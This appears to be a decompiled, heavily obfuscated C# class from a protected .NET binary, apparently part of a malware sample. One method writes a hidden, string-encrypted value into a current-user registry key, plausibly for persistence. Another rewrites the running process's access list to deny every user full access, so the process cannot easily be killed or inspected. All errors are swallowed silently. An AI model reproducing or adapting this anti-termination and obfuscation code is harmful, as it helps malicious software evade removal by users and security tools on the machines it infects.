using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace coxZRmDhvSAWo;

internal sealed class msIxNAkvXqbRy
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr kaGRlfKjLuC, int DioDyiVPTDF, [Out] byte[] nyQPUjAKpdGWa, uint WpkeKdbfhpkfJL, out uint beebYDNlzDaF);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr TNilKoAIFzP, int uLrMyzoiUIVTh, [In] byte[] LkXSQXLxiFAAR);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void gtmprhShLwMwfr(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(aSOyqwTwiifNb.FEZRNsQdHf(aSOyqwTwiifNb.DCsyUOPpHm(getString_0(107401337))));
			registryKey.SetValue(aSOyqwTwiifNb.FEZRNsQdHf(getString_0(107401264)), getString_0(107403766));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor bRfETredyZtnCKUV(IntPtr intptr_0)
	{
		byte[] nyQPUjAKpdGWa = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, nyQPUjAKpdGWa, 0u, out var beebYDNlzDaF);
		if ((long)beebYDNlzDaF > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, nyQPUjAKpdGWa = new byte[beebYDNlzDaF], beebYDNlzDaF, out beebYDNlzDaF))
		{
			return null;
		}
		return new RawSecurityDescriptor(nyQPUjAKpdGWa, 0);
	}

	private void raQNFOtsQonLv(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void twHMAgwIrosII()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = bRfETredyZtnCKUV(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			raQNFOtsQonLv(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static msIxNAkvXqbRy()
	{
		Strings.CreateGetStringDelegate(typeof(msIxNAkvXqbRy));
	}
}
